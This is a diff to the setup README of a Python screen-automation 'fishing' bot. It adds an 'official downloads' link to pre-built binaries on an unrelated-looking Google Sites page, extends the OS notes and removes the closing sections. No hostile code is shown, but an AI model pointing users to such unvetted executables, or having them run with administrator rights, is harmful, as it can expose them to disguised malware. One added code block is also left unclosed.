@@ -1,3 +1,11 @@
+# PyWare Fishing V4
+
+Pre-built versions are available for supported platforms on the official releases page:
+
+[Official Downloads / Releases](https://sites.google.com/view/icf-automation-network/downloads?authuser=0)
+
+If a pre-built version is not available for your system, follow the source installation guide below.
+
 # Project Environment Setup Guide
 
 ## 📋 Overview
@@ -8,7 +16,10 @@ This guide walks through setting up Python and all required modules for running 
 
 ## 1️⃣ Prerequisites
 
-- **OS**: Windows, macOS or Linux (experimental)
+- **OS**:
+  - Windows (fully supported)
+  - macOS (fully supported)
+  - Linux (experimental / manual setup only)
 - **Administrator/Root access** may be needed for certain system-level operations
 - **Internet connection** for downloading packages
 
@@ -122,6 +133,18 @@ pytesseract.pytesseract.tesseract_cmd = "/opt/homebrew/bin/tesseract"
 
 > **Note for Apple Silicon (M1/M2/M3)**: If you encounter issues with OpenCV on Mac, prefer `opencv-python-headless` or use Rosetta translation.
 
+### 🐧 Linux — Experimental Support
+
+Linux is supported for running from source, but pre-compiled builds may not be available for every distribution.
+
+Additional requirements may be needed:
+
+#### Ubuntu/Debian example:
+
+```bash
+sudo apt update
+sudo apt install python3 python3-venv python3-tk tesseract-ocr
+
 ### 🪟 Windows — Additional Requirements
 - Ensure Administrator privileges when running the script if it needs to capture system-level input/output
 - The built-in Python libraries (`json`, `os`, `re`, `time`, `sys`) require no installation
@@ -146,8 +169,12 @@ from pynput.mouse import Controller as MouseController, Button
 import cv2, numpy as np, mss
 if sys.platform == "win32":
     import ctypes, wintypes
+
 elif sys.platform == "darwin":
-    from Quartz import NSScreen  # noqa: F401 (just verifying the import works)
+    from Quartz import NSScreen
+
+elif sys.platform.startswith("linux"):
+    from Xlib import X, XK, display as Xdisplay
 
 import requests, io
 
@@ -166,32 +193,3 @@ Run it with `python test_imports.py` — no errors means your setup is complete.
 | `ModuleNotFoundError: No module named 'tesseract'` | Install Tesseract OS package first, then `pip install pytesseract` |
 | `M1 Mac — OpenCV error about libGL` | Use `opencv-python-headless` instead of regular opencv |
 | Permission denied on screenshot/capture | Run the script as Administrator (Windows) or with elevated privileges (macOS) |
-
----
-
-## 📁 Project Structure Recommendation
-
-```text
-your-project/
-├── .venv/                 # Virtual environment (hidden)
-├── src/                   # Your source code
-│   └── main.py            # Entry point
-├── requirements.txt       # Lock your dependencies here!
-├── test_imports.py        # Verification script above
-└── README.md              # This file, updated with your details
-```
-
----
-
-## 💡 Final Tips
-
-1. **Pin versions** in `requirements.txt` to avoid environment drift:
-   ```text
-   webview==4.x.x
-   numpy==1.x.x
-   opencv-python-headless==4.x.x
-   ```
-
-2. Keep the virtual environment activated while developing — it saves time and prevents conflicts with system Python.
-
-3. If you share your project publicly, always provide a `requirements.txt` so others can reproduce your setup easily!
